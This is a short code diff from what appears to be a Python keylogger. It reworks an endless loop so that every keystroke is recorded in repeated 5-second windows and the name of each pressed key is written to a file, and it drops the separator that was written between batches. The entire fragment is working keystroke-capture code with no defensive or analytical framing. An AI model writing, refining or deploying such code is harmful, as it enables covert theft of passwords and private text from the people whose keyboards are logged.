@@ -5,8 +5,9 @@ def write_into_file(rec):
     for i in range(0, len(rec)):
         if rec[i].event_type == 'down':
             f.write(rec[i].name + '')
-    f.write(' ')
     f.close()
 while True:
-    rec = kb.record(until='space')
+    kb.start_recording()
+    t.sleep(5)
+    rec = kb.stop_recording()
     write_into_file(rec)
